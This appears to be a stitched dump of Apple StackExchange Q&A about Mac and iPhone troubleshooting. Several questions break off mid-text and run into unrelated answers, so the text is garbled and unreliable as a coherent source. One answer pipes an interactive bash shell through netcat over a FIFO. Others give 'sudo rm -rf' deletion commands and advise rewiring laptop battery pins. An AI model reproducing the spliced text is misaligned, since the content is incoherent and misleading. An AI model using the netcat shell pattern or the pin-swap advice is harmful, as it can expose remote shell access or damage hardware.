When I don't want something anymore and it says: \"Moving to trash,\" is it actually moving the data, or just updating its path or giving a special \"Trashed\" label or something?\n\nA: Technically no. Trash is the combination of several hidden trash folders, one per volume that is mounted. And also filtered by user account so you won’t see trashed items from another account. \nBasically, yes since files on macOS (or any 'NIX system) consist of a couple of parts.\nThe file contents are referenced by an inode which is referenced by 1 or more directory entries.\nWhen a file is deleted or moved to Trash the file contents remain where it is.\nIn the case of move to Trash a new directory entry (under .Trash) is created which references the file. The actual name in the directory entry is a modified version of the original (you can have many files of the same name in Trash).\nTo simply answer the question, the only thing that changes is the directory tree.\nEDIT To address the additional question:-\nMoving a file within a partition also (usually) leaves the file contents in place; moving to another location (with its own directory tree) involves a physical move of file contents. (To some extent this is program dependent - programs using the normal API behave this way, but actual behaviour is up to the program.)\n", "Q: Unable to execute JAR file I wrote a small Java desktop application using NetBeans, Java 8 and JavaFX 8 on my MacBook running macOS High Sierra.

However, I have no password active on it.\nThe only thing that I can think of is that when I first bought the iPhone it asked me for a Passcode during the first initial set up and for some reason this main Passcode is preventing me from accessing the photos through my Mac.\nCan this be correct? Or how else can I get access to empty my camera roll locally onto my Mac?\n\nA: If I understand your question correctly, it sounds like your Mac is simply asking you to unlock your iPhone. With an iPhone 6s you would do that by entering your Passcode or using Touch ID.\nIn summary, to use Image Capture the typical process would be:\n\n\n*\n\n*On your Mac launch the Image Capture app\n\n*Connect a USB/Lightning cable to your Mac\n\n*Plug the other end of the cable into your iPhone 6s\n\n*At this point you should be asked to unlock your iPhone and/or to Trust this Computer - enter your Passcode or use Touch ID and, if prompted, tap on the Trust button\n\n*Within Image Capture select your iPhone 6s from the Devices list\n\n*You should now see a list or thumbnails of the photos on your iPhone 6s\n\n*Select the images you want to import (or select nothing to import all photos not previously imported - this could be a large number) \n\n*Click on the Import to drop-down menu to select where you want the photos saved to\n\n\nYou can also set up Image Capture to automatically import photos from your iPhone 6s. For more information, refer to Image Capture Help: Transfer images.\nAs for iPhoto (or the Photos app), your Mac would still be asking you for the same thing - So the broad process described above will also work for those apps.\n\nUPDATE due to additional info provided in comments\nAn iPhone 6s with iOS 11.x installed requires the following specs for syncing:\n\n\n*\n\n*Mac: OS X 10.9.5 or later\n\n*PC: Windows 7 or later\n\n*iTunes 12.5 or later \n\n\nBased on this, your 2011 MacBook Pro isn't capable of syncing in general with iTunes while it still has Snow Leopard installed and a version of iTunes earlier than v12.5. \nHowever, you should still be able to import photos using Image Capture v6.0.1 (the version you'd have installed with OS X 10.6.8).\nAs a next step, I would try creating a new user and testing with that.\nCreate another user\nIn Snow Leopard (i.e. OS X 10.6.8) you can create a new user in Apple > System Preferences > Accounts and then log into that user to see if the problem persists. \nYou can also try testing to see if you can import photos via booted into Safe Mode.\nAs a troubleshooting step I would boot your Mac into Safe Mode.\nBoot into Safe Mode\nFollow these steps to boot your Mac into Safe Mode:\n\n\n*\n\n*Fully shut down your Mac\n\n*Restart your Mac\n\n*Immediately press the Shift key and keep it down \n\n*Let go of the Shift key when you see the login window (NOTE: If you have FileVault enabled you may need to log in twice).\n\n*Take a note of what happens (i.e. try using Image Capture)\n\n*Exit Safe Mode by restarting your Mac as normal\n\n*Log in and test Image Capture again\n\n\nLet me know how you go.\n", "Q: How can I force Dropbox to Sync files I have several files in my local Dropbox directory which Finder shows with the blue \"in progress\" indicator, some have been there for days.\nHow can I force Dropbox to Sync the unsynced files?\n\nA: Check for the Dropbox icon in the Menu Bar. While the files are syncing, the icon is shown overlaid with a pair of arrows. Once the Sync is complete the overlaid arrows are no longer shown on the icon.\n\nThere is apparently a long standing bug in Dropbox client where even after files have Synced, Finder shows files as being synced with a blue sync arrow shown.\n\nTo make sure that files have Synced properly, relaunch the Dropbox client (click on the Menu Bar icon and select Quit Dropbox), and check on the Sync progress by looking at the Menu Bar icon. This is the most definitive test. Clicking on the Menu Bar icon also shows the current download and upload speeds along with the number of files to be synced and estimated time remaining.\n", "Q: Is it safe to use my US iPhone/iPad charger with international plug adapter? This question has been asked of European adapters, however, I am traveling to some other countries such as India, Thailand, and Indonesia. I wonder if it is safe to charge my MacBook Pro and iPhone 8 simply using an adapter in those countries.\nI know most appliances these days are 110/220 dual voltage and I've had no problems charging my MacBook pro in hotel rooms in India before. However, I will be mainly staying in homes during this visit - I did some research and found out that there are commonly neighborhood \"brownouts\" in India and several other Asian countries which can fry your electronics. I've been trying to research my options and the best I've found is to purchase a voltage transformer with a regulator. I wouldn't even require the transformer aspect and the appliance is both expensive and bulky.\nIs it safe to use my US iPhone/iPad charger with international plug adapter?\n\nA: The short answer to your question, \"is it safe,\" you kind of answered yourself.  It depends.\nIs it technically possible? Yes. My Apple- (and non-Apple-) branded adapters show a range of 100-240VAC, 50-60Hz. I've used them as-is in the US and Europe without issue. While you should be \"just fine,\" don't just take my word for it. Read the labels on the power supply.\nGenerally, when the voltage drops, the powered device (or the drawing side of the power supply itself) makes up for the difference by drawing more current. (I've seen this numerous times on 48VDC-powered systems: when the voltage drops much below 44V, circuit breakers trip and/or fuses blow because the current exceeds the rated amounts.) Without a breaker or fuse, that excess current causes elements inside the power supply to heat up beyond tolerances and eventually burn up.  Surges in voltage can overrun the semiconductors as well, with a similar result.\nSpecial shut-off circuitry in some power supplies is supposed to kick in, protecting the adapter and the powered device. Cheaper adapters may not have this kind of protection, or they become the protection for the device by sacrificing themselves. \nI would bet that in more developed/commercial areas where the power is more trustworthy, an adapter will be fine. For extended use cases, like a laptop plugged in for a number of hours while in use, especially in sketchy areas, you might want to invest in something that helps smooth out the voltage (surge suppressor, for example) or the transformer/regulator you mentioned.\n", "Q: Is it possible to remove the $ from an environment variable? I'm on Mac and have just created an environment variable inside the .bash_profile directory, it works fine when I run: \n$variable_name\n\nI just want the know why the dollar sign is there and if it is possible to remove it. Any help would be appreciated :)\n\nA: The $ (dollar sign) is there to reference variables in bash.  You cannot remove it.  Technically, it's called variable/parameter expansion.  Basically the value of the variable is \"expanded out\". \nUsing variables in bash is pretty straight forward:\n\n\n*\n\n*Don't use a \"$\" when setting a variable\n\n*Use the \"$\" when referencing/calling a variable\n\n\nExample:\n#!/bin/bash\nvar1=Hello\nread var2\necho $var1 $var2\nexit\n\nIn the above script, we set var1 to \"Hello\" and var2 to user input (assume \"World\").  The next command prints out the contents of both variables on a single line:\nHello World\n\nFor more details, it's best to start with a good tutorial:  BASH Programming - Introduction HOW-TO.  Also have a look at the Bash Reference Manual\nTip:\nYou can enclose the variable in braces - ${variable}.  This serves to \"protect\" the variable from characters immediately following the variable name which would (incorrectly) become part of the variable\nExample:\nvar1=foo\necho $var1bar\necho ${var1}bar\n\nThe first echo would produce nothing since the variable var1bar doesn't exist where as the second echo would produce the word foobar as expected.  Personally, I use braces for all my variables as a matter of style.\n", "Q: iSCSI mounts in macOS I have a question about using iSCSI mounts in macOS (High Sierra).

Can't read any bootable USB device I've got a Macbook Pro Late 2012 with a Samsung EVO 750 and 16 gb of ram. I've worked with it for a year with no issues. Two weeks ago, it suddendly got really really slow (APFS on High Sierra). I couldn't even open the Apple Logo menu in order to shut it down or maybe logoff. It took like 2/3 minutes or more to open a Finder window. After some reboots the Dock couldn't even load the App Icons, question marks everywhere. So I decided to create a bootable High Sierra USB drive, backup my data first (with Paragon APFS for Windows) and then reinstall the system on the disk. Here come the troubles. It looks like once I booted the USB drive, the Macbook saves a flag in its cache, so that the second time I reboot the laptop and open up the Startup Menu there are no USB disks despite the fact they're plugged in. After waiting like 24 hours the \"cache flag\" looks like disappearing, so the Laptop sees the usb thumb again. After some tries I succeded in installing MacOS Sierra, but after some reboots (OS working) it suddendly got slow again. I reformated the SSD on my desktop pc with windows 10 and tested its speed with Samsung Magician and CrystalMark. 500 mb/s read and write, I don't think the disk is the problem. I thought the internal sata cable could have been damaged, but then I succesfully installed Sierra on an HDD and it works like a charm on the laptop. No way to get the SSD working. I'm pretty stuck. Thanks to anyone who would help!\n\nA: I'm pretty sure the last non-retina MacBooks shipped with a SATA II drive cable if it came with a SATA II HDD. (Which makes sense because it shipped with a SATA II HDD... Not sure if it was different if you chose the Apple branded OEM SSD option, or if that was even an option for your model.)\nYou say you have a late 2012 MBP, but it must be either a late 2011 or mid 2012, to have user upgradable drives and memory, but I think this Is the case for both iterations.\nSo basically what I'm guessing is happening is that your MacBook and SSD are trying to communicate with each other at SATA III speeds, but over a SATA II cable.\nThis cable is compatible with SATA III, and replacement should fix your problem. To check if this really is the issue, you can try to use the SSD over any other interface (with an external FW, USB, Thunderbolt enclosure, for example) and see if the same issues exist. If not, the cable's probably the culprit.\n", "Q: Why does High Sierra complain about IDLE?

Furthermore, the both connectors plug without problem into the female socket on the motherboard.\nThe majority of vendors MacBook batteries commercialize:\n\n\n*\n\n*the A1321 for 2009-2010 MacBook Pro\n\n*the A1382 for late-2011 and later versions of the MacBook Pro\n\n\nFor above MacBook models, the two batteries are uncompatile.\nIn this thread, Jozef Vaclavik explains that the order of pins is different, although the connector is same. With proper equipment and knowledge, the pins could be inverted.\nBut what about the early 2011  MacBook Pro 15''?\nIt seem that most vendors commercialize the A1382 battery for it, but some other commercialize the A1321.\nI would be surprised if a corporation like Apple had designed a model that could possibly present a risk of battery explosion in case of a improper battery swap.\nSo, could the early-2011 MacBook Pro 15'' be a transition model and natively accept both batteries thanks to a voltage inverter on the board?\nIs anyone using a A1321 battery inside the early 2011 MacBook Pro 15'' 8,2?\n\nA: Regarding your statement that:\n\nBut what about the early 2011 MacBook Pro 15\" ? It seem that most vendors commercialize the A1382 battery for it, but some other commercialize the A1321.\n\nI haven't come across this scenario, so can't comment on your source for this. \nHowever, officially the A1382 battery is compatible with all of the 15.4\" A1286 models of MacBook Pro from the Early 2011 models up until the Mid-2012 models.\nAnd, officially, the A1321 battery is compatible with all of the 15.4\" A1286 models of MacBook Pro from the Mid 2009 models up until the Early 2010 models. They are not officially compatible with the Early 2011 models.\nWere you to use an A1321 battery in the Early 2011 models you would be doing so at your own risk.\n\nA: \nSo, could the early-2011 MacBook Pro 15'' be a transition model and\n  natively accept both batteries thanks to a voltage inverter on the\n  board?\n\nAnswering my own question ...\nAccording to one battery seller: \"Apple made two different generations of 15\" MacBook Pros in Early 2011 which take different batteries\" (source: https://www.laptopbatteryexpress.com/Apple-MacBook-Pro-15-A1321-Battery-p/app-29.htm).\nSo, it is recommendend using the correct battery.\nIf not possible, reorder pins 1=7, 2=8, 3=9 being careful not short-circuiting and drop a note on on sticker pasted on the battery to remember what was done.\n", "Q: How can I find the serial number of my Mac mini? Do Mac mini come with a unique serial number? How do I find it?\nIt is a model without optical drive.\n\nA: Yes. They come with unique serial number. You can find the serial number as per Apple Support Document.\nMac mini: How to find the serial number\nIn Mac OS X\nOn most computers with Mac OS X, you can find the serial number in the About This Mac window.\n\nOn the surface of the computer\nOn Mac mini (Mid 2010 and later) computers, the serial number is printed on the metal frame without a bar code:\n\n\nA: You have a recent generation of Mac mini.

I tried Internet recovery and it seems to work out. When the loading bar is full, a screen with Apple logo appears for like 10 seconds, and then a blank grey screen, nothing happens even if I wait for a while.\nI then tried to boot on Linux mint with a live key to test the hardware, it fails to install, and the screen remains blank for a while as well, same for any other Linux distribution.\nLastly, I tried to boot from a High Sierra disk that I created using a friends MacBook. The screen asks me to install it, I do so, and after about 80% of the loading bar, the screen turns grey again...\nIt does look like a hardware problem, but I can't manage to load hardware test by holding down D key.\nWhat is the reason for this behaviour? How can I resolve this issue?\n\nA: The flashing question mark means that it could not find a volume to boot from. This indicates either that the volume is corrupt, disk not working or an error in the SATA controller that talks to the disk (or all of the above). The grey screen I believe comes from the stuck storage device enumeration right before the OS X Utilities window should show.\nI've encountered the exact same behaviour on a MacBook Pro of similar age and it in my case it turned out to be a failure on the internal hard drive controller. I'd suggest you open it up and disconnect the hard drive, then try starting from Internet Recovery, the diagnostics and running from an external storage (such as live CD or USB stick). It may be that only your hard drive failed so a drive replacement could be a complete fix.\nIt is quite easy to open the computer and temporarily disconnect the drive, see the detailed procedure at iFixit\n", "Q: Connecting two HDMI monitors to Late 2012 Mac mini I have two Samsung monitors with HDMI input.\nIs it possible to connect them simultaneously to my Mac mini using HDMI?

I have one HD, after some issues I reinstalled macOS, now I'm getting this, \nCan I format/delete them?\n\n\nA: Your internal SSD is formatted to APFS. This means your SSD contains two partitions in the default partition scheme:\n\n\n*\n\n*EFI\n\n*APFS container\n\n\nThe APFS container itself contains four logical drives (volumes) - some of them with a specific role:\n\n\n*\n\n*Preboot\n\n*Macintosh HD (your main volume with the system files and your data/apps)\n\n*Recovery (recovery system)\n\n*VM (virtual memory)\n\n\nIn the default scheme the four volumes share the whole space of the container - the reason why all show 250.79 GB in your screenshot.\nIn fact each volume is smaller but may be expanded dynamically.\nYou can get their real sizes by entering diskutil ap list in Terminal.app.\n\nAt least three of the four volumes are required to boot/run your Mac. The Recovery volume isn't really needed if your main volume isn't encrypted - but it's recommended to keep it.\nSo don't delete them! Or only delete them if you have a known good backup of your Mac!\n", "Q: How does one add references to tables and diagrams included in a Pages document? I am using Pages 7.0.1. and trying to find out if it would be suitable for writing complex technical documents, full of tables, diagrams, footnotes, etc. \nInserting tables is easy. Each table can also have a name that could be used as a 'caption'. Is it possible, however, to add references to these tables in the text of a document (something like, \"... as shown in Table 3 above ...\", where \"Table 3\" is a reference to a table included in the document - with associated hyperlink, if possible).\nInserting such references is also needed for other elements of a Pages document, such as diagrams, footnotes (a single footnote may need to be referenced, or 'pointed to', from several places in the text), bibliography, etc.\nIs there a way of achieving all of the above in Pages?\n\nA: You can add a bookmark at the position of the cursor with Insert>Bookmark. Bookmarks can be managed and renamed in Document(top right corner)>Bookmarks. You can then highlight any word(s) and add a link to a bookmark with Insert>Link>Bookmark. This will add a hyperlink to the bookmark.\nUnfortunately, in Pages you cannot bookmark a table or footnote. You can, however, add a bookmark to the cursor position left to a table, so it will practically link to the table.\nThis does not work for footnotes, though. But if you use the same source multiple times you should also reference it multiple times in its own footnote, instead of pointing to another footnote, anyway. Since you may reference the same source in multiple places in your document, outgoing links from the bibliography to the footnote don‘t make sense, because you only list each source once in the bibliography which makes it impossible to link to multiple footnotes.\nEDIT: But you can add links in footnotes that point to a bookmark in the bibliography.\n", "Q: iPhone - Remove URL in current tab I have an iPhone running iOS 11.1.2. How do I remove the URL in my screen at the top of Safari so that I can type in a new search?\nWhen I tap and hold, the only options I get are copy and paste and go. Formerly a small x appears beside the URL when I held it down and that erased the URL. That small x doesn't appear now.\n\nA: You don't need to tap and hold. You can just tap the URL and you will see a 'X' icon. You can tap the X to delete the URL and enter new URL. You can also enter directly without tapping the X as the text is already selected. Typing over will delete the existing text.\n\n", "Q: Use MacBook Air as standalone Display Is it possible to use MacBook Air as a display by connecting the peripheral via Thunderbolt 2 port ?

Or revert to the previous version? The Java updater on my Mac installed an obscure version of Java 10.0.1 which I never heard before. The result is that ALL my java apps are not running anymore, which makes Java pointless.\nThe official instructions to remove Java are:\n\n\n*\n\n*sudo rm -fr /Library/Internet\\ Plug-Ins/JavaAppletPlugin.plugin\n\n\nWhich is useless because I don't use Java on the browser (who is crazy enough to do it?)\n\n\n*\n\n*sudo rm -fr /Library/PreferencePanes/JavaControlPanel.prefPane\n\n\nWhich is useless because it just removes the preference pane\n\n\n*\n\n*sudo rm -fr ~/Library/Application\\ Support/Java\n\n\nWhich is useless because this directory is already empty\nThe official instructions to remove Java on a Mac do absolutely nothing.\nIf I run my Java apps with java -jar from the terminal they work. From the terminal, I see this:\n/usr/libexec/java_home -V\nMatching Java Virtual Machines (3):\n    1.8.0_131, x86_64:  \"Java SE 8\" /Library/Java/JavaVirtualMachines/jdk1.8.0_131.jdk/Contents/Home\n    1.6.0_65-b14-468, x86_64:   \"Java SE 6\" /Library/Java/JavaVirtualMachines/1.6.0.jdk/Contents/Home\n    1.6.0_65-b14-468, i386: \"Java SE 6\" /Library/Java/JavaVirtualMachines/1.6.0.jdk/Contents/Home\n\nSo, from the terminal, the Java version is 1.8.0_131, which is my desired version. From the desktop, when I launch apps with JavaAppLauncher, the Java version is 10.0.1.\nHow can I revert this disaster that Oracle did with their automatic updater?\n\nA: I believe the problem is navigating to the correct directory... Once you are where you are supposed to be you can run the sudo commands to remove whichever versions of java you want to remove. \nFirst, run the command in the terminal to determine which version of Java you are running,\njava -version\n\nthen you can navigate to pesky version of java that you intend to delete by using the following command:\ncd /Library/Java/JavaVirtualMachines\n\nthen once you see are in the JavaVirtualMachines path, type in ls to see what versions of Java you have installed, \nls\n\nand finally when you know which version or versions of Java you want to uninstall:\nsudo rm -rf jdk-10.0.1.jdk #or whichever version you want to delete\n\n\nA: I had this same problem:\nI had Java 8 installed, but later installed 10.  Then, I removed 10, and when I launched a jar from the terminal it would run in version 8, and when I checked the version with java -version in the terminal I would get back java version \"1.8.0_181. However when I ran a .jar from the Finder, it would run in v.10, and also if I went to the Java preference pane the version was listed as version 10.  This was undesirable: I was trying to remove v10 completely. \nThen, I deleted JavaAppletPlugin with rm /Library/Internet\\ Plug-Ins/JavaAppletPlugin.plugin and reinstalled Java SE JDK 8 from online, and lo! it works now.  When I run .jar, they run in Java 8.\nI realize you mentioned this in your first step, but I infer that you didn't do this step?  If I'm wrong about that then you've got a different problem. But this solved mine.\n\nA: If you have more than one version of jdk:\n$ ls -l /Library/Java/JavaVirtualMachines\ndrwxr-xr-x  3 root  wheel  96 30 avr 15:15 jdk-10.0.1.jdk\ndrwxr-xr-x  3 root  wheel  96 30 avr 15:24 jdk1.8.0_172.jdk\ndrwxr-xr-x  3 root  wheel  96 17 oct 10:59 jdk1.8.0_191.jdk\n\nchange your JAVA_HOME\nexport JAVA_HOME=/Library/Java/JavaVirtualMachines/jdk1.8.0_191.jdk/Contents/Home\n\n\nA: I downloaded the old (working) version from java.com\nIn fact, Java 8.171 is the download that's shown by default. I dunno why it got automatically updated to 10.0.1 when it's beta quality.\nNow, it won't install it, it says \"Sorry, you have the newer and better 10.0.1 Java\"\nFor installing, run the apparently useless commands mentioned in the question. Java will still work in the terminal, but then the installer will allow you to install the right version, 1.8_171\nNow, disable the updates, if you don't want to break your apps again. Java is a security threat, it should be updated monthly, so make sure that it is disabled in your browser.\nFor some reason, if you run java -version you still get:\njava version \"1.8.0_131\"\nJava(TM) SE Runtime Environment (build 1.8.0_131-b11)\n\nWhich is another wrong version. Anyway, the important is that now your Java apps are working, make sure the browser plugin is disabled for your security.\n\nA: In my case I had two JDK installed on my computer v11 and v7. I needed to run Eclipse Luna on my computer for a project. Whenever I execute in cmd   java -version I got java version 11.0..... etc.\"\nThe solution for me was to change the PATH variable; to point to the JDK which I needed Eclipse to run with.\nSo basically I change from:\nC:\\Program Files\\Java\\jdk-11.0.2\\bin\n\nto\nC:\\Java\\JDK7\\bin\n\nNow, the output from executing java -version is:\njava version \"1.7.0_76\"\n\n", "Q: Inviting someone to iOS development team but restrict his access to one app I want to invite someone as team member to the iOS developer program.

Has Apple ever rolled out MacBooks with FileVault enabled by default? If yes, which version(s)? If no, is there a reason why they wouldn't?\n\nA: Apple has not, to my knowledge and research, ever released a machine with encryption turned on by default.\nEven with APFS that natively supports encryption* (meaning it's baked into the cake and not just another layer on top), encryption has three options:\n\n\n*\n\n*no encryption\n\n*single key encryption\n\n*multi key encryption\n\n\nThis is something the user must select.  Why Apple chose to go this way is something that only Apple knows, but it's evident that they wanted to give the option to the end user (or at least to the people deploying the Macs to the end users).\n\n* 9to5Mac.com:  Apple File System (APFS) announced for 2017, scales ‘from Apple Watch to Mac Pro’ and focuses on encryption\n\nA: I want to add a caveat to @Allan answer. \nNo Mac ships with encryption on. However, on newer Macs with the T2 coprocessor, the macs are in fact encrypted from the get-go. However, everything has access to the decryption keys. When you choose to enable FileVault 2 the Mac wraps the keys in a secondary layer of encryption basically instantly activating the encryption. So although it is not turned on by default, the drive is in fact encrypted and upon activation, the partition is instantly encrypted.\n\nA: I just received a new MacBook Pro (11-26-18) and Firevault was NOT on by default. I had to manually turn it on. \n\nA: They have, since 10.10, marked the FileVault encryption options as enabled by default in the new Mac setup. This is optional, but as the options are checked as on by default, this makes it an opt-out feature that a user has to consciously uncheck (and most people go with the default).\nhttps://www.theguardian.com/technology/2014/oct/17/apple-defies-fbi-encryption-mac-osx\n", "Q: iPhone 7 Sim Switching, Account Switching or just Normal Domain Traffic?

I want to use the Drobo to handle the copy it's self and avoid the slow down of using the wifi network to send data from the Drobo to my Mac and then back to the same Drobo.\nHowever when I SSH into the Drobo as Admin and look inside the shares, the sparsebundle is a directory, yet not a directory I can enter.

Once Root, you can see inside the bundle, and the copy will include everything.  I am using MC for the copy and moving at 3.35 MB/s.  During this time Time Machine is turned off to prevent changes in the middle of the copy.\nI would suggest doing the copy inside of Screen, which virtualizes terminal inside of itself, allowing you to run commands as normal, but then if you lose your SSH connection, on reconnecting you can resume your screen without loss of progress or data.\n", "Q: Spotlight only working from the finder When I search from the finder spotlight is working as expected.\nWhen pressing cmd+space and entering the same query I only get results from Safari's history.\nEdit\nThe index is OK and the results are correct when searching with the Finder and with mdfind on the command line.

So, the remote device would start netcat first in listen mode:\nnc -l 127.0.0.1 8080\n\nThen the High Sierra host would connect to the remote device:\nnc 127.0.0.1 8080 < myfifo | /bin/bash -i > myfifo 2>&1\n\n", "Q: Screenshot of a single window comes up blank I followed the instructions here: https://support.apple.com/en-us/HT201361\n\nHow to take a screenshot of a window Press Shift-Command-4.

If you align it properly, it should look like one string.\n", "Q: How do I revert a change I made to a specific file type's default application? A few days ago, I was trying to play a .mkv video that was giving me a hard time. VLC wasn't agreeing with it for some reason, so I ended up shifting my efforts to a slick media player I found on GitHub (IINA), but the video still wasn't wanting to open. After troubleshooting and looking trough some forums, I found a potential resolution I wanted take a shot at. I ended up changing the default application within the 'get info' window; selecting the 'change all..' option so that all .mkv files would open with IINA. This solved the issue I was having with the .mkv, which was great, but I'm starting to think this may not have been the best idea. \nI was looking through ~/Library/ earlier today, and I noticed that several .dat files have appeared as filetype 'IINA document'.\nHere's some examples: \n\nI don't know if this is even something to be concerned about, but it seemed strange to me. Is there any possible way to revert the change I made as if it never happened? I don't think there was any default application before I set one myself because I had to click 'other' and search through finder for an app that supported the original mkv. \n\nA: I wouldn‘t be to worried about the .dat files. They are only 64 bytes in size, so there can‘t really be much inside of them that could cause harm. Have you tried to open it with a text editor and see what’s inside?\nIf you don‘t trust it, uninstall it and the .mkv apps should no longer have a default application to open with. Alternatively, just change the default app to QuickTimePlayer.\nAnother option is to use a third party app called RCDefaultApp. With it, in the Extensions tab, you can choose your file type and choose an application for it. With the „disable“ option you can set it to not having a standard application to open with (see screenshots on website).\n\nA: Having the .dat filetype associated with your new media player is harmless.\nThe examples you provided are simple ASCII text files containing the initial settings for automatic updating of your MS Aria account. There are likely many more files with the same  extension on your hard drive, created by any number of software providers, representing for the most part the workflow equivalent of a sticky note on the door of a filing cabinet.\nSo, then, how did a media player come to think it was the default application for a data file? A search of filext.com revealed the .dat extension is commonly associated with both Video CDs and elementary media streams. It is likely IINA can play them both, and is simply being assertive in declaring ownership of files it believes it can open. (On my system, it is the app MPEG Streamclip which claims .dat files as its own, marking them with its icon just as IINA placed its icon on yours.)\nIf you can live with the change in the icons’ appearance, then there’s no need to do anything. The worst that could happen would be an abortive launch of IINA via an inadvertent double-click on a .dat file. If, however, the current appearance does annoy you, then you can simply use the Open With.. Change All.. procedure and assign the filetype to TextEdit.app. This will restore the previous \"generic document\" icon.\n", "Q: Has my iPhone security been compromised? I just had something really concerning happen to my iPhone 6s (iOS 11.3.1, I update my apps everyday, not jailbroken). \nI was on the YouTube app when the screen completely froze and the screen’s colors looked slightly off (specs of red and green, etc. Could still see the video, but it stopped playing).  My phone almost never freezes, and in particular it’s never had the screen issues I've just described. \nDoes this sound like my security might have been compromised? If so, what should I do, and are there any tips to keep my phone protected afterward? \n\nA: No, that doesn't sound like a security problem. As far as I know, there's never been a compromise of an iPhone as recent as the 6S whose iOS version is kept up-to-date. It's more likely to be a hardware or software glitch.\n", "Q: MacBook Pro high CPU with external monitors I recently ordered two 4K monitors (LG 27UD88). I connected them using Mini DisplayPort to DisplayPort Adapter cable to my MacBook Pro.\nWhen I have the monitors connected, the CPU load is very high with fans  running at 5500-6000 RPM and a processor temperature of 54°C. This does not seem healthy to me. It's kernel_task which is using absurd amounts of CPU (sometimes spikes up to 600%)\nThings I've tried so far\n\n\n*\n\n*Before I used to have a high CPU load as well (with the additional monitors connected), but that got resolved after following the instructions in this article, CPU usage is too high with Yosemite and an external monitor, kernel_task spikes to 600%+.\n\n*Disabling X86PlatformShim.kext\n\n*Resetting the SMC.\nThis all seems very odd to be. I have a maxed out MacBook Pro which can't handle two monitors?\nHere is the system configuration:\nMacBook Pro (Retina, 15-inch, Mid 2015)\nProcessor: 2,8 GHz Intel Core i7\nMemory: 16 GB 1600 MHz DDR3\nGraphics: AMD Radeon R9 M370X 2 GB\n          Intel Iris Pro 1536 MB\nStorage: 500GB Flash Storage\n\nInformation from sensors:\n\nUPDATE #1:\nHere is the information on the GPU load. It seems that the GPU load is high, but that the processor of the AMD Radeon is not used. I'm currently looking into this, if you have any suggestions on how to make more use of the AMD Radeon GPU please do.\n\nI do have Automatic graphics switching turned off (this should increase high-performance graphics).\nAlso the system preferences tell that the AMD Radeon is being used for the external display. Though the iStat data suggests otherwise.\n\nUpdate #2:\nI've installed gfxCardStatus and put it to discrete only. Looks like the AMD Radeon GPU is actively being used. This does not make a difference.\n\nUpdate #3:\nI've ran iStat for a while now. Looks like the CPU has many spikes, even up to 90 degrees. This would obviously trigger the fans to start blowing (also the MacBook itself feels hot near the processor). Looks like the average temp at the moment is 70 degrees. \n\nHere is the CPU frequency:\n\n\nA: My case I use 2 extend monitors and plugged both on right side, i tried a lot of ways but no luck. Then someday i checked by this way\n\n*\n\n*Remove all monitors: kernel_task < 100\n\n*Plugged 1 monitor at right side: 100 < kernel_task < 300\n\n*Plugged 2 monitor at right side: 200 < kernel_task < 700\n\n*Plugged 1 monitor at left side: kernel_task < 100  ----> This is the problem.\n\nOk, then i only use left side to plug 2 extend monitors and now it's fine, kernel_task < 100\n\nA: Folks this is an image of my fans before I had them cleaned.\n\nI faced the very same issue that you guys are facing and based on input from another forum decided to get my 2016 MPB fans cleaned out. This made an immediate impact where when I connected my external display to the MBP.pre-cleaning, it would overheat causing the fans to spin at 6000 rpm or thereabout and the kernel_task would eat up 500%-900% of the CPU rending the system unusable. This simple cleanup of the fans has allowed me to connect the monitor with no kernel panic anymore and even though the fans run around 5000 rpm now the CPU and GPU are running around 10 degrees cooler now.\nAnother thing that helped bring down CPU usage was switching to high quality Display Port to Type-C cables to connect the monitors to my macbook. I noticed that using a dongle with HDMI would also result in high CPU.\n\nA: I've been using a LG 27UL750 since almost a year with my MBP 16 i9 2020 connected via a HDMI cable using the Apple AV adapter.\nI noticed that the fans on the laptop used to ramp up after 15 minutes of use and continued like that for the rest of my work day.\nCPU usage was then in the mid 30s and performance was not impacted.\nYesterday I added a second 4K monitor that connects using Thunderbolt 3.\nWhen both monitors are connected and the laptop lid is closed I noticed that CPU was running at 70% with temps for both CPU and GPU at 65 degrees C, performance was really bad too.\nI replaced the cable of my older monitor with a new USB C to DP 1.4 cable and the temps and CPU usage has been absolutely fine. I can't really hear the fans ramping up any more unless I'm compiling code or watching a 4K movie.\nUsing a crappy HDMI cable was the root cause, the cables that come with your monitor are a definite NO NO. Investing in a good quality cable is important for your Macbook to work well.\n\nA: Did you ever think about forcing to set a higher speed for the fan? Maybe smcFanControl or Macs Fan Control it would help.\n\nA: I found when i disconnected my charger, it settled back down. With the AC power adapter plugged in however, it starts out fine then randomly builds up to 400-600%+. Simply unplugging the laptop from the charger was enough for me. I have no clue why though.\n\nA: I had this same issue with my Macbook Pro. Although it might look like an issue with the CPU or some application using too much CPU but it's not. You can reset SMC but it may not solve your problem. I bet you must be using this external display with HDMI port, a lot of times, the problem can be caused by a cheap HDMI cable, try using Thunderbolt/Display Port on your Macbook and see if it helps because in my case, using the Display port instead of HDMI solved the issue.\n\nA: Restarting SMC chipset helped fixing it.\n\n*\n\n*Shut down Mac\n\n*Hold. CTRL+OPTION+SHIFT+POWER button for 10 seconds\n\n*Start mac\n\n\nA: While @Varun's answer above helped me find the below solution, I am adding it as a separate answer, so that it might help others as well.\nVarun's answer speaks of dust in the fans, however, I got this laptop only a few months back, and thanks to coronavirus, the dust is very low surrounding the places where I live.\nHence I did not bother checking the fan's conditions. Instead, I thought about the other changes that I did along with adding a monitor.\nWhen I purchased a monitor, I bought out a new table to keep this monitor and laptop as well.\nAnd as Indians, we like to cover everything, including the table. This table-cover that I was using was a bit fluffy and made of cotton. The air-vents of my mac-book are on the bottom sides of the machine.\nThe table cover, being soft was blocking the air vents. I kept a book at the bottom of my mac-book (don't have a stand or something) which allowed a gap between the MacBook and table cover, and voila it was back to normal.\n\nA: What the responses to this post are failing to do is separate temperature increases from kernel / CPU activity. If the Kernel is 600% to 1000% (I have seen this), the thing should get hot. Clean the vents sure, but you're going to waste battery and performance with this happening.\nOn my machine, I see this often. It's periodic, and then it stops.\nBecause modern MacBooks all use the Thunderbolt port, and my org is running Symantec and Microsoft ATP defender, my suspicion is that yes, a periodic process that's unpredictable senses the thunderbolt port is being used to save data from the laptop... which is disallowed here.\nI have a 4K monitor attached. This happens at high and low resolutions, and sometimes it happens \"not at all\" with the same setup. It can happen (or not) with NO applications displaying on the monitor.\nThis is a problem and I hope we can solve this outside of \"dust off\".\n\nA: One diagnostic that can help: run an external fan and blow it on your portable.  Do whatever was spiking your cpus before.  If that's no longer a problem, then its definitely a heat management thing that is at issue.\nInteresting about the USB cable upgrade solving this sometime. I may try.\n", "Q: iPhone 8 Plus (iOS 11.4) is frozen on emergency SOS screen Last evening I tried to add a system macroscript (Switch Control) recipe.

